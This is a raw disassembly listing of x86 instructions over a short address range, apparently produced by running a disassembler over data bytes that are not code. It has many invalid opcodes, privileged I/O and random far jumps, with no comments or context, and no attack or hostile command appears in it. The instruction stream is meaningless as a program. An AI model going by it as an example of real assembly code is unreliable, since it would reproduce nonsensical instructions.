  41e6ff:	xchg   DWORD PTR [ebx+0x6647713d],ebp
  41e705:	retf   
  41e706:	mov    eax,0xda1e418
  41e70b:	dec    edx
  41e70c:	mov    ds:0x98ed6467,al
  41e711:	in     al,0x68
  41e713:	jmp    FWORD PTR [edi+0x32cf55a4]
  41e719:	push   edi
  41e71a:	cmp    al,0xf7
  41e71c:	ret    
  41e71d:	outs   dx,BYTE PTR ds:[esi]
  41e71e:	in     al,dx
  41e71f:	pop    ebx
  41e720:	shl    DWORD PTR [edx-0x170e30e3],0x53
  41e727:	(bad)  
  41e728:	arpl   WORD PTR [esi+0x12],bp
  41e72b:	stos   BYTE PTR es:[edi],al
  41e72c:	cdq    
  41e72d:	jae    0x41e6d0
  41e72f:	mov    ds:0x191faac7,al
  41e734:	ins    DWORD PTR es:[edi],dx
  41e735:	retf   0x2b9a
  41e738:	in     al,0x65
  41e73a:	pop    esi
  41e73b:	(bad)  
  41e73c:	fwait
  41e73d:	(bad)  
  41e73e:	iret   
  41e73f:	add    ah,ch
  41e741:	xchg   ebp,eax
  41e742:	xchg   ecx,eax
  41e743:	mov    ds:0xca74bd50,al
  41e748:	out    dx,eax
  41e749:	stos   DWORD PTR es:[edi],eax
  41e74a:	(bad)  
  41e74c:	int3   
  41e74d:	frstor [eax]
  41e74f:	fdiv   DWORD PTR [ebx-0x19]
  41e752:	fbld   TBYTE PTR [esi-0x24]
  41e755:	jmp    0xf7a0:0x5b98f5b6
  41e75c:	push   ebx
  41e75d:	pop    eax
  41e75e:	mov    edx,0x189d0490
  41e763:	ret    
  41e764:	jno    0x41e7bc
  41e766:	sub    BYTE PTR [ebx-0x74cafe26],ah
  41e76c:	out    dx,al
  41e76d:	add    al,0xcd
  41e76f:	push   esi
  41e770:	adc    ch,BYTE PTR [ebp-0x24d56cc5]
  41e776:	mov    esi,0xdb41d606
  41e77b:	add    ecx,eax
  41e77d:	nop
  41e77e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e77f:	adc    edx,DWORD PTR [esi]
  41e781:	xchg   DWORD PTR [esi+0x366e9935],eax
  41e787:	lods   al,BYTE PTR ds:[esi]
  41e788:	es clc 
  41e78a:	rcl    dl,1
  41e78c:	retf   0x9682
  41e78f:	(bad)  
  41e790:	ds sub dh,cl
  41e793:	out    dx,eax
  41e794:	fiadd  WORD PTR [ebx+0x3]
  41e797:	jne    0x41e7fa
  41e799:	not    BYTE PTR [ecx+0x14]
  41e79c:	add    bl,bl
  41e79e:	pushf  
  41e79f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7a0:	(bad)
  41e7a4:	popa   
  41e7a5:	pop    es
  41e7a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7a7:	mov    edi,DWORD PTR [edi]
  41e7a9:	pushf  
  41e7aa:	out    0x2d,eax
  41e7ac:	and    BYTE PTR [ebx-0x6c],dl
  41e7af:	test   BYTE PTR [ecx+0x9ca7b12],0x89
  41e7b6:	jne    0x41e78c
  41e7b8:	(bad)  
  41e7b9:	fistp  WORD PTR ds:0x2af366d0
  41e7bf:	enter  0xfba2,0x4c
  41e7c3:	fnsave [edx+edx*2+0x13e2dd79]
  41e7ca:	pop    ebp
  41e7cb:	inc    ecx
  41e7cc:	cwde   
  41e7cd:	inc    ecx
  41e7ce:	xchg   ecx,eax
  41e7cf:	push   ebx
  41e7d0:	jmp    0x7fd6:0x9a2bcf75
  41e7d7:	xchg   edx,eax
  41e7d8:	das    
  41e7d9:	mov    bl,0x61
  41e7db:	dec    esi
  41e7dc:	in     al,0x36
  41e7de:	icebp  
  41e7df:	push   edi
  41e7e0:	sahf   
  41e7e1:	pop    ss
  41e7e2:	test   BYTE PTR [ecx-0x42818cd4],dl
  41e7e8:	aaa    
  41e7e9:	dec    ecx
  41e7ea:	bound  edx,QWORD PTR [eax-0x55]
  41e7ed:	lds    edi,FWORD PTR [edi]
  41e7ef:	pop    eax
  41e7f0:	pop    ecx
  41e7f1:	fidiv  WORD PTR [ebx]
  41e7f3:	leave  
  41e7f4:	and    eax,0xea14524
  41e7f9:	pop    ebx
  41e7fa:	push   esp
  41e7fb:	sub    al,BYTE PTR [edx]
  41e7fd:	mov    ecx,0x5dc87661
  41e802:	mov    WORD PTR [eax-0x66],cs
  41e805:	push   esp
  41e806:	dec    esp
  41e807:	mov    al,0xb2
  41e809:	jge    0x41e802
  41e80b:	cmp    eax,0xffffffc8
  41e80e:	test   BYTE PTR [edx+edi*2-0x43],0xae
  41e813:	scas   al,BYTE PTR es:[edi]
  41e814:	das    
  41e815:	ror    DWORD PTR [eax-0x5ba5b385],cl
  41e81b:	xor    ebp,DWORD PTR [edx]
  41e81d:	bound  edx,QWORD PTR [ecx-0x2d]
  41e820:	fdiv   DWORD PTR [edx-0x424ebef2]
  41e826:	sub    DWORD PTR [eax+0x56bf1706],esp
  41e82c:	addr16 jle 0x41e865
  41e82f:	ret    0x77f0
  41e832:	cmp    eax,0x3b731910
  41e837:	xor    al,0x65
  41e839:	pusha  
  41e83a:	mov    ss,edi
  41e83c:	pop    es
  41e83d:	xor    bl,BYTE PTR [edx]
  41e83f:	sub    eax,0xf29377e
  41e844:	test   al,dh
  41e846:	dec    esi
  41e847:	dec    edi
  41e848:	mov    ecx,0xf018c0
  41e84d:	mov    DWORD PTR [ebx],ebp
  41e84f:	rcr    cl,1
  41e851:	aad    0x43
  41e853:	xlat   BYTE PTR ds:[ebx]
  41e854:	ins    BYTE PTR es:[edi],dx
  41e855:	scas   al,BYTE PTR es:[edi]
  41e856:	push   0x2372ebf8
  41e85b:	dec    ecx
  41e85d:	loopne 0x41e894
  41e85f:	dec    edx
  41e860:	jecxz  0x41e7e5
  41e862:	shl    eax,1
  41e864:	vfmadd132ss xmm5,xmm7,DWORD PTR [ebx+0x1c079332]
  41e86d:	mov    ebp,0x60cc580a
  41e872:	mov    ebx,0x7930155d
  41e877:	xor    ecx,DWORD PTR [ecx]
  41e879:	test   DWORD PTR [edx+0x56a24c0c],ecx
  41e87f:	push   ebx
  41e880:	loopne 0x41e81a
  41e882:	mov    dl,0x19
  41e884:	add    ebx,esp
  41e886:	sbb    ecx,DWORD PTR ds:0x3acc7887
  41e88c:	cmp    al,0x20
  41e88e:	mov    eax,ds:0x773642cd
  41e893:	test   dl,dl
  41e895:	xor    DWORD PTR [ebx-0x66],esp
  41e898:	int    0x19
  41e89a:	adc    eax,0x6ae58493
  41e89f:	mov    edi,0x2e4d60f9
  41e8a4:	add    edi,DWORD PTR [ebx-0x4cb0864]
  41e8aa:	fcmovnb st,st(1)
  41e8ac:	stos   BYTE PTR es:[edi],al
  41e8ad:	jle    0x41e90e
  41e8af:	jb     0x41e8f2
  41e8b1:	stc    
  41e8b2:	xor    DWORD PTR [eax],edi
  41e8b4:	add    BYTE PTR [ebx+0x70],0x46
  41e8b8:	popf   
  41e8b9:	gs cli 
  41e8bb:	mov    bl,0x96
  41e8bd:	push   ecx
  41e8be:	adc    esi,DWORD PTR [edx+0x42fce60f]
  41e8c4:	push   edx
  41e8c5:	adc    eax,0xab8f4d72
  41e8ca:	adc    eax,0x71fba958
  41e8cf:	call   0xdf1:0x6399584c
  41e8d6:	jno    0x41e8dd
  41e8d8:	retf   0x81ca
  41e8db:	outs   dx,BYTE PTR ds:[esi]
  41e8dc:	add    BYTE PTR [edi],bl
  41e8de:	mov    esp,0xa1104cf9
  41e8e3:	ret    
  41e8e4:	sbb    edi,ebp
  41e8e6:	popf   
  41e8e7:	shl    BYTE PTR [esp+ebp*1+0x75],1
  41e8eb:	xor    DWORD PTR [ebx+0x30],edi
  41e8ee:	xchg   esi,eax
  41e8ef:	iret   
  41e8f0:	push   ebx
  41e8f1:	mov    edi,0x2369a37b
  41e8f6:	(bad)  
  41e8f7:	int    0xbe
  41e8f9:	inc    edx
  41e8fa:	xor    DWORD PTR [ebx],esi
  41e8fc:	test   cl,bl
  41e8fe:	call   0x2ceba1f0
  41e903:	and    ebx,DWORD PTR [ebp+0x16]
  41e906:	out    0x2d,al
  41e908:	dec    ebp
  41e909:	in     eax,dx
  41e90a:	minps  xmm2,XMMWORD PTR [ecx]
  41e90d:	mov    dh,0x42
  41e90f:	rcl    DWORD PTR [esi+eax*8+0x4f],cl
  41e913:	ins    DWORD PTR es:[edi],dx
  41e914:	pop    ss
  41e915:	push   0xafc7c72f
  41e91a:	aaa    
  41e91b:	daa    
  41e91c:	push   0xffffff98
  41e91e:	and    ecx,esp
  41e920:	test   al,0x94
  41e922:	pop    esp
  41e923:	xor    ecx,DWORD PTR [edi-0x6]
  41e926:	xor    esi,DWORD PTR [ecx-0x20dba9f6]
  41e92c:	out    dx,eax
  41e92d:	ficomp DWORD PTR [eax+0x3]
  41e930:	and    al,0x51
  41e932:	(bad)  
  41e933:	repnz dec eax
  41e935:	mov    esi,0x6bb74311
  41e93a:	jecxz  0x41e8eb
  41e93c:	iret   
  41e93d:	jns    0x41e8ea
  41e93f:	pop    edx
  41e940:	push   ss
  41e941:	cli    
  41e942:	aam    0x27
  41e944:	push   ss
  41e945:	fimul  DWORD PTR [eax+esi*2-0x28]
  41e949:	add    eax,0xb9e64349
  41e94e:	jns    0x41e8ed
  41e950:	mov    ebp,0x62723ae5
  41e955:	in     eax,0x8c
  41e957:	pop    edx
  41e958:	mov    eax,ds:0x39fd3c10
  41e95d:	cmp    eax,0xdb4943c
  41e962:	test   BYTE PTR [ecx-0x55],dh
  41e965:	es and al,0xba
  41e968:	bound  ecx,QWORD PTR [esi-0x4f]
  41e96b:	iret   
  41e96c:	aas    
  41e96d:	jb     0x41e9a5
  41e96f:	repz sbb al,0x8a
  41e972:	and    bl,BYTE PTR [ebx-0x38679623]
  41e978:	test   BYTE PTR [edi],0xef
  41e97b:	mov    edi,esp
  41e97d:	and    ebp,DWORD PTR [edi+0x23ec78c3]
  41e983:	xchg   esp,eax
  41e984:	dec    edx
  41e985:	jecxz  0x41e9b7
  41e987:	out    0x7b,al
  41e989:	xchg   ebx,eax
  41e98a:	push   edx
  41e98b:	mov    dh,cl
  41e98d:	fs jbe 0x41e95a
  41e990:	in     al,0x3b
  41e992:	loop   0x41e990
  41e994:	and    esi,edx
  41e996:	xchg   esi,eax
  41e997:	adc    ebp,DWORD PTR [ebx]
  41e999:	and    al,bl
  41e99b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e99c:	fdiv   QWORD PTR [eax+0x3f]
  41e99f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9a0:	inc    ebp
  41e9a1:	pop    edx
  41e9a2:	loopne 0x41e9e2
  41e9a4:	ja     0x41e9f2
  41e9a6:	jns    0x41e9e9
  41e9a8:	jecxz  0x41e931
  41e9aa:	and    cl,BYTE PTR [eax+0x68]
  41e9ad:	scas   eax,DWORD PTR es:[edi]
  41e9ae:	(bad)  
  41e9af:	gs loop 0x41e9cf
  41e9b2:	repz mov ds:0xae238765,eax
  41e9b8:	push   ebp
  41e9b9:	xor    ecx,DWORD PTR [eax+eiz*4-0x3d]
  41e9bd:	loop   0x41e95a
  41e9bf:	mov    dh,0x1d
  41e9c1:	ds pop edi
  41e9c3:	aam    0xee
  41e9c5:	sub    al,0xd8
  41e9c7:	les    ebx,FWORD PTR [edi]
  41e9c9:	call   0x140e:0xebb1d766
  41e9d0:	hlt    
  41e9d1:	lock (bad) 
  41e9d3:	dec    ebx
  41e9d4:	popf   
  41e9d5:	sbb    ecx,DWORD PTR [esi-0x2a]
  41e9d8:	(bad)  
  41e9d9:	xchg   ebx,eax
  41e9da:	and    al,0x94
  41e9dc:	sub    eax,0xba8ff391
  41e9e1:	retf   0xdce8
  41e9e4:	cmp    bh,BYTE PTR [esi+edx*4+0x5e]
  41e9e8:	aas    
  41e9e9:	mov    DWORD PTR [ebx+0x1b],edx
  41e9ec:	mov    cl,0x83
  41e9ee:	adc    edx,DWORD PTR [edi]
  41e9f0:	es xchg edi,eax
  41e9f2:	lahf   
  41e9f3:	aam    0x7a
  41e9f5:	jo     0x41ea3c
  41e9f7:	push   ebp
  41e9f8:	clc    
  41e9f9:	aaa    
  41e9fa:	pop    eax
  41e9fb:	adc    DWORD PTR [esi-0x49],ecx
  41e9fe:	imul   esi,DWORD PTR [eax],0x1d
  41ea01:	pop    es
  41ea02:	mov    bh,0x5f
  41ea04:	adc    eax,DWORD PTR [eax+edx*4]
  41ea07:	int3   
  41ea08:	sub    BYTE PTR [ecx+0x50],ch
  41ea0b:	add    dl,BYTE PTR [ebx-0x48]
  41ea0e:	jecxz  0x41e995
  41ea10:	je     0x25a0fc99
  41ea16:	loop   0x41ea22
  41ea18:	stos   DWORD PTR es:[edi],eax
  41ea19:	and    bh,BYTE PTR [ebp-0x332e3878]
  41ea1f:	sub    ebp,ebx
  41ea21:	clc    
  41ea22:	fldl2e 
  41ea24:	jecxz  0x41ea2c
  41ea26:	adc    eax,0xf509f84
  41ea2b:	lds    edi,FWORD PTR [edi+0x41245b19]
  41ea31:	mov    WORD PTR [ebp+0x7ffe559b],es
  41ea37:	sti    
  41ea38:	push   eax
  41ea39:	add    al,0xc2
  41ea3b:	aaa    
  41ea3c:	in     eax,0x16
  41ea3e:	xchg   edi,eax
  41ea3f:	sbb    BYTE PTR [edx*8-0x4750c699],0xd8
  41ea47:	js     0x41ea1f
  41ea49:	fisub  DWORD PTR [esp+edx*2-0x16]
  41ea4d:	scas   eax,DWORD PTR es:[edi]
  41ea4e:	arpl   WORD PTR cs:[ecx-0x353ae000],dx
  41ea55:	pop    eax
  41ea56:	pop    eax
  41ea57:	sub    esi,0x813f35a6
  41ea5d:	repz test esi,eax
  41ea60:	push   esi
  41ea61:	cmp    DWORD PTR [ecx],0x54dea2c9
  41ea67:	data16 std 
  41ea69:	retfw  
  41ea6b:	inc    ebp
  41ea6c:	out    0x38,al
  41ea6e:	mov    edx,0x854215fe
  41ea73:	imul   BYTE PTR [edx+edx*4+0x7df2ddae]
  41ea7a:	shl    DWORD PTR [esi+eax*4-0x47],0xc0
  41ea7f:	shl    DWORD PTR [esi+0x5b],cl
  41ea82:	xchg   ebp,eax
  41ea83:	out    dx,al
  41ea84:	arpl   cx,dx
  41ea86:	cwde   
  41ea87:	in     al,0x73
  41ea89:	call   0xd1d0:0xfcf46c6c
  41ea90:	push   eax
  41ea91:	mov    al,ds:0xbcc60100
  41ea96:	aam    0x14
  41ea98:	pop    ds
  41ea99:	ss clc 
  41ea9b:	inc    ebx
  41ea9c:	xchg   esi,eax
  41ea9d:	mov    WORD PTR [ebx+esi*8-0xd5e23fb],?
  41eaa4:	mov    ebx,0x40d1cff6
  41eaa9:	loopne 0x41ea69
  41eaab:	stos   BYTE PTR es:[edi],al
  41eaac:	int3   
  41eaad:	mov    ebp,0xb9919300
  41eab2:	lock mov ebx,0x423731f4
  41eab8:	jle    0x41ea98
  41eaba:	pop    esp
  41eabb:	mov    ebx,DWORD PTR [edi+0xcbd9946]
  41eac1:	jo     0x41ea64
  41eac3:	mov    esi,0xb5fddfd5
  41eac8:	sub    al,0xc6
  41eaca:	jge    0x41eaf9
  41eacc:	or     eax,0x4a69706e
  41ead1:	push   esp
  41ead2:	dec    esi
  41ead3:	dec    esi
  41ead4:	mov    ds:0x2708b647,eax
  41ead9:	and    al,0x65
  41eadb:	loopne 0x41ead6
  41eadd:	or     ah,bh
  41eadf:	sub    dh,BYTE PTR [ebp-0x49]
  41eae2:	sbb    al,0x93
  41eae4:	rcl    dh,1
  41eae6:	shl    BYTE PTR ds:0x5181ab63,0x85
  41eaed:	iret   
  41eaee:	dec    eax
  41eaef:	in     al,0x8
  41eaf1:	sbb    DWORD PTR [ecx+0x4b],eax
  41eaf4:	sbb    BYTE PTR ds:0x64ef5992,bl
  41eafa:	cmp    esi,DWORD PTR [edx-0x3b]
  41eafd:	ja     0x41eabe
  41eaff:	pop    ds
  41eb00:	iret   
  41eb01:	jno    0x41eb00
  41eb03:	push   edx
  41eb04:	pop    ebp
  41eb05:	rcr    ecx,0x52
  41eb08:	sar    BYTE PTR [edi-0x44],0xab
  41eb0c:	cmp    al,0x3a
  41eb0e:	xor    al,bl
  41eb10:	jno    0x41eb54
  41eb12:	pop    edi
  41eb13:	loope  0x41eb40
  41eb15:	mov    ebp,0xec22015
  41eb1a:	sbb    eax,0x1b56ce65
  41eb1f:	fdiv   QWORD PTR [ebx+ebp*4]
  41eb22:	mov    eax,0xf9441b74
  41eb27:	push   ss
  41eb28:	add    edx,DWORD PTR [esi]
  41eb2a:	lods   al,BYTE PTR ds:[esi]
  41eb2b:	mov    ecx,0x4508f51d
  41eb30:	sbb    BYTE PTR [ebp-0x6f],al
  41eb33:	add    cl,dl
  41eb35:	out    0x10,eax
  41eb37:	sar    DWORD PTR [eax+edi*8+0x4e],0xbf
  41eb3c:	fs loope 0x41eb73
  41eb3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb40:	fcmovnbe st,st(3)
  41eb42:	cmp    al,0xef
  41eb44:	in     al,dx
  41eb45:	sub    BYTE PTR [ebx],0x52
  41eb48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb49:	mov    edi,0x5294699f
  41eb4e:	pop    ebx
  41eb4f:	mov    eax,0x98b94f30
  41eb54:	nop
  41eb55:	pop    ss
  41eb56:	(bad)  
  41eb58:	mov    edx,0x4fa9c1e7
  41eb5d:	add    al,0x17
  41eb5f:	ins    DWORD PTR es:[edi],dx
  41eb60:	ss stos DWORD PTR es:[edi],eax
  41eb62:	inc    ebx
  41eb63:	xor    ah,bl
  41eb65:	(bad)  
  41eb66:	fadd   DWORD PTR [edx]
  41eb68:	popa   
  41eb69:	hlt    
  41eb6a:	mov    cl,al
  41eb6c:	sub    al,0x97
  41eb6e:	sub    ebp,eax
  41eb70:	popa   
  41eb71:	mov    ecx,0x9cf2d4b9
  41eb76:	xor    DWORD PTR [ecx+0x2457d6e5],esi
  41eb7c:	mov    ebp,0xc7d8ad58
  41eb81:	mov    dh,0xea
  41eb83:	mov    bl,0x1d
  41eb85:	sub    al,0xfb
  41eb87:	add    DWORD PTR [edx-0x1a],ebx
  41eb8a:	pop    ebp
  41eb8b:	fwait
  41eb8c:	mov    ah,0x26
  41eb8e:	or     eax,0x11af43f8
  41eb93:	outs   dx,DWORD PTR ds:[esi]
  41eb94:	je     0x41eb31
  41eb96:	push   ebp
  41eb97:	in     al,dx
  41eb98:	leave  
  41eb99:	std    
  41eb9a:	push   es
  41eb9b:	and    ah,BYTE PTR [esi]
  41eb9d:	cmp    al,0x27
  41eb9f:	jecxz  0x41eb92
  41eba1:	pop    edi
  41eba2:	bound  esi,QWORD PTR [esi+eiz*2+0x16]
  41eba6:	mov    ebx,0x578d0dda
  41ebab:	lea    esp,[ebp-0x259d9714]
  41ebb1:	mov    eax,fs
  41ebb3:	stc    
  41ebb4:	mov    ds:0xaa6358ef,eax
  41ebb9:	pop    eax
  41ebba:	int    0xfb
  41ebbc:	imul   edx
  41ebbe:	cli    
  41ebbf:	and    DWORD PTR [ebp+0x4c331d7a],edi
  41ebc5:	inc    esi
  41ebc6:	cli    
  41ebc7:	mov    esi,0xf51a9eae
  41ebcc:	dec    si
  41ebce:	ret    
  41ebcf:	and    ch,0xb5
  41ebd2:	ret    
  41ebd3:	push   ebx
  41ebd4:	sahf   
  41ebd5:	and    ebx,DWORD PTR [esi-0x6c]
  41ebd8:	jg     0x41ebb2
  41ebda:	mov    ecx,0xc829c71e
  41ebdf:	sbb    al,0xe3
  41ebe1:	sub    DWORD PTR [edi+0x6f2c8abf],0xffffffe6
  41ebe8:	shl    BYTE PTR [edx+0x46],1
  41ebeb:	pop    ss
  41ebec:	push   0x69
  41ebee:	dec    ebx
  41ebef:	in     eax,dx
  41ebf0:	ror    BYTE PTR [ecx-0x32],cl
  41ebf3:	jmp    0x8de5:0xaa9f0e4d
  41ebfa:	(bad)  
  41ebfb:	pop    ecx
  41ebfc:	into   
  41ebfd:	popa   
  41ebfe:	adc    DWORD PTR [eax],0xffffffdc
  41ec01:	or     BYTE PTR [edx],dl
  41ec03:	push   edi
  41ec04:	ja     0x41ebf8
  41ec06:	xchg   DWORD PTR [edi],ebp
  41ec08:	call   0xb8c1:0xfa5b07c1
  41ec0f:	xchg   ebx,eax
  41ec10:	cmp    ebp,DWORD PTR [edx+0x32f38039]
  41ec16:	xchg   ebx,eax
  41ec17:	lea    ebx,[ecx-0x3080042b]
  41ec1d:	cmc    
  41ec1e:	jge    0x41ec64
  41ec20:	loop   0x41ebe3
  41ec22:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41ec24:	or     BYTE PTR [eax+0x1c],dh
  41ec27:	lods   eax,DWORD PTR ds:[esi]
  41ec28:	out    dx,eax
  41ec29:	pop    edx
  41ec2a:	push   ds
  41ec2b:	cs (bad) 
  41ec2d:	fwait
  41ec2e:	push   ss
  41ec2f:	lahf   
  41ec30:	int3   
  41ec31:	fbld   TBYTE PTR [ecx]
  41ec33:	pop    ds
  41ec34:	and    eax,0xa715da1d
  41ec39:	push   edi
  41ec3a:	push   edx
  41ec3b:	pop    es
  41ec3c:	call   0x4ca4:0x193cfc7a
  41ec43:	add    BYTE PTR [edi-0x1c8e491c],dl
  41ec49:	mov    al,0x2d
  41ec4b:	pop    ds
  41ec4c:	sbb    dl,dl
  41ec4e:	in     al,dx
  41ec4f:	mov    WORD PTR [edi-0x4b607d04],cs
  41ec55:	fisttp DWORD PTR [ecx-0x46]
  41ec58:	sti    
  41ec59:	sbb    eax,0x7b08a5ce
  41ec5e:	sbb    al,0xe9
  41ec60:	push   0x5790fe6a
  41ec65:	jecxz  0x41ecb1
  41ec67:	xchg   DWORD PTR [esi+eiz*8],esp
  41ec6a:	add    al,0x78
  41ec6c:	pop    ebx
  41ec6d:	fcmovbe st,st(3)
  41ec6f:	outs   dx,DWORD PTR ds:[esi]
  41ec70:	scas   eax,DWORD PTR es:[edi]
  41ec71:	dec    esp
  41ec72:	push   eax
  41ec73:	xor    dl,dl
  41ec75:	inc    ebp
  41ec76:	fwait
  41ec77:	and    eax,0xb9c7f36c
  41ec7c:	sub    eax,0x7adb6f11
  41ec81:	mov    esi,0xdd417e2e
  41ec86:	sbb    dh,al
  41ec88:	sub    DWORD PTR [ecx+eax*4],esp
  41ec8b:	xchg   DWORD PTR [ebp+esi*8-0x67ff2f50],edi
  41ec92:	or     DWORD PTR [ebx+0x71],esp
  41ec95:	add    eax,0x6fcef86d
  41ec9a:	mov    esi,0x65767ad4
  41ec9f:	es push ebp
  41eca1:	xchg   ebp,eax
  41eca2:	call   0x2408:0xa7d62bae
  41eca9:	out    dx,al
  41ecaa:	mov    cl,0xf5
  41ecac:	xchg   esi,eax
  41ecad:	jp     0x41ec52
  41ecaf:	or     BYTE PTR [ecx],bl
  41ecb1:	jb     0x41ece1
  41ecb3:	push   0x28
  41ecb5:	fist   DWORD PTR [edx+0x428920f1]
  41ecbb:	aam    0xcf
  41ecbd:	(bad)  
  41ecbe:	or     BYTE PTR gs:[ecx-0x6486e2a2],cl
  41ecc5:	pop    ebx
  41ecc6:	iret   
  41ecc7:	jns    0x41ec9d
  41ecc9:	or     ecx,ebp
  41eccb:	test   al,0x8f
  41eccd:	or     eax,0x1cb7d8e5
  41ecd2:	mov    ds:0x8c69604d,eax
  41ecd7:	adc    bl,ch
  41ecd9:	jg     0x41eceb
  41ecdb:	xchg   esp,eax
  41ecdc:	mov    esi,0x8810a04e
  41ece1:	test   esi,esi
  41ece3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ece4:	imul   edx,DWORD PTR [eax],0x873c85b9
  41ecea:	push   ebp
  41eceb:	arpl   WORD PTR [eax+ebx*8+0x1d],cx
  41ecef:	(bad)  
  41ecf0:	aad    0x25
  41ecf2:	add    ch,BYTE PTR [edi+ecx*4-0x42e58c5]
  41ecf9:	stc    
  41ecfa:	fsubr  QWORD PTR [ebp+0x23]
  41ecfd:	sub    BYTE PTR [esi-0x50113e08],bh
  41ed03:	push   ebp
  41ed04:	cmc    
  41ed05:	push   esi
  41ed06:	jne    0x41ed0b
  41ed08:	ret    
  41ed09:	pop    ss
  41ed0a:	lahf   
  41ed0b:	leave  
  41ed0c:	test   DWORD PTR [eax-0xc47249],0xf30c81
  41ed16:	xchg   ebx,eax
  41ed17:	adc    edi,esi
  41ed19:	fidivr WORD PTR [edx-0x51]
  41ed1c:	and    al,0x29
  41ed1e:	sbb    ecx,DWORD PTR [eax]
  41ed20:	xchg   ebp,eax
  41ed21:	xor    ecx,DWORD PTR [edx+0x7c]
  41ed24:	xor    ch,BYTE PTR [edx]
  41ed26:	adc    al,0xef
  41ed29:	and    ecx,ecx
  41ed2b:	sub    DWORD PTR [edx],ecx
  41ed2d:	or     DWORD PTR [ebx],esi
  41ed2f:	retf   0xce60
  41ed32:	shl    BYTE PTR [edx],1
  41ed34:	rol    DWORD PTR [esi-0x49],0xa1
  41ed38:	test   ebp,eax
  41ed3a:	popf   
  41ed3b:	fstp   TBYTE PTR [edi+0x20bf8c59]
  41ed41:	xor    ebx,0x79e994d9
  41ed47:	cwde   
  41ed48:	das    
  41ed49:	jno    0x41ed92
  41ed4b:	jmp    0xf763:0x62548db7
  41ed52:	sbb    dh,BYTE PTR [ecx+eiz*8]
  41ed55:	cli    
  41ed56:	jmp    0xbf9ed2e5
  41ed5b:	(bad)  [ecx]
  41ed5d:	sub    eax,0x1e4060bc
  41ed62:	arpl   WORD PTR [edi+0x25ea7575],si
  41ed68:	xchg   ebp,eax
  41ed69:	mov    ds,WORD PTR [esi]
  41ed6b:	push   esi
  41ed6c:	pop    ebx
  41ed6d:	mov    eax,ds:0xe64f438c
  41ed72:	sub    al,0x4d
  41ed74:	adc    eax,0xf2060c53
  41ed79:	call   0x4e07:0xe68214d
  41ed80:	outs   dx,DWORD PTR ds:[esi]
  41ed81:	xchg   al,ch
  41ed83:	inc    edi
  41ed84:	dec    ebx
  41ed85:	ds push ss
  41ed87:	push   edx
  41ed88:	xchg   esi,eax
  41ed89:	mov    BYTE PTR [edx+0x7b4aec46],cl
  41ed8f:	add    eax,0xcf273923
  41ed94:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41ed96:	scas   eax,DWORD PTR es:[edi]
  41ed97:	rol    BYTE PTR [ecx+0x4c509d46],1
  41ed9d:	pusha  
  41ed9e:	add    ebx,ebp
  41eda0:	add    eax,0x33ade22b
  41eda5:	mov    ah,0x57
  41eda7:	inc    esi
  41eda8:	dec    edx
  41eda9:	ficom  DWORD PTR [edx+0x49]
  41edac:	fild   DWORD PTR [eiz*4-0x2279892]
  41edb3:	in     al,0x59
  41edb5:	xchg   ecx,eax
  41edb6:	data16 xlat BYTE PTR ds:[ebx]
  41edb8:	mov    WORD PTR [ebp+0x10e9e6aa],gs
  41edbe:	fs push ebp
  41edc1:	dec    esp
  41edc2:	jae    0x41ed4f
  41edc4:	es int3 
  41edc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edc7:	loop   0x41eda7
  41edc9:	not    BYTE PTR [ebx+0x142a9154]
  41edcf:	nop
  41edd0:	iret   
  41edd1:	pop    eax
  41edd2:	fisttp QWORD PTR [esi]
  41edd4:	cmp    DWORD PTR [ebx-0x37df24ec],eax
  41edda:	fldcw  WORD PTR fs:[eax+0x48eef599]
  41ede1:	jb     0x41edb6
  41ede3:	jns    0x41ed99
  41ede5:	lods   eax,DWORD PTR ds:[esi]
  41ede6:	lods   al,BYTE PTR ds:[esi]
  41ede7:	adc    BYTE PTR ds:0xbd2c953d,0x60
  41edee:	loopne 0x41eddb
  41edf0:	cs pushf 
  41edf2:	retf   
  41edf3:	dec    ebp
  41edf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edf5:	xlat   BYTE PTR ds:[ebx]
  41edf6:	inc    DWORD PTR [edi+eax*8+0x46cf6016]
  41edfd:	ins    BYTE PTR es:[edi],dx
  41edfe:	mov    DWORD PTR [edx-0x158256f4],eax
  41ee04:	iret   
  41ee05:	push   eax
  41ee06:	dec    ebx
  41ee07:	mov    ah,BYTE PTR [ecx-0x78]
  41ee0a:	fsubr  st,st(4)
  41ee0c:	cdq    
  41ee0d:	(bad)  
  41ee0e:	jle    0x41edf6
  41ee10:	or     al,0x68
  41ee12:	sbb    BYTE PTR [ebp-0x2],ch
  41ee15:	mov    al,BYTE PTR [edi]
  41ee17:	xchg   DWORD PTR [edi-0x50],ebx
  41ee1a:	retf   
  41ee1b:	nop
  41ee1c:	stc    
  41ee1d:	gs xchg ebp,eax
  41ee1f:	xlat   BYTE PTR ds:[ebx]
  41ee20:	sbb    eax,0x37afe593
  41ee25:	xor    eax,ebp
  41ee27:	in     al,0xf5
  41ee29:	mov    eax,0x225f7ef4
  41ee2e:	mov    eax,ds:0x8234d0cf
  41ee33:	mov    ebp,0xad32788b
  41ee38:	hlt    
  41ee39:	outs   dx,DWORD PTR ds:[esi]
  41ee3a:	jb     0x41ee98
  41ee3c:	and    ch,bl
  41ee3e:	add    ch,0xbc
  41ee41:	into   
  41ee42:	sbb    eax,DWORD PTR [eax-0x58c7fa7]
  41ee48:	ds popa 
  41ee4a:	inc    esi
  41ee4b:	fisub  WORD PTR [ebx-0x51d3bfeb]
  41ee51:	pop    esi
  41ee52:	ret    0xe3aa
  41ee55:	mov    al,ds:0x72eb8ba9
  41ee5a:	xor    BYTE PTR [ecx],al
  41ee5c:	cmp    al,0x8d
  41ee5e:	inc    edi
  41ee5f:	aas    
  41ee60:	jno    0x41edf7
  41ee62:	and    ah,BYTE PTR [edx+0x7]
  41ee65:	cmp    ch,BYTE PTR [edx]
  41ee67:	inc    eax
  41ee68:	mov    edi,0x2562bb46
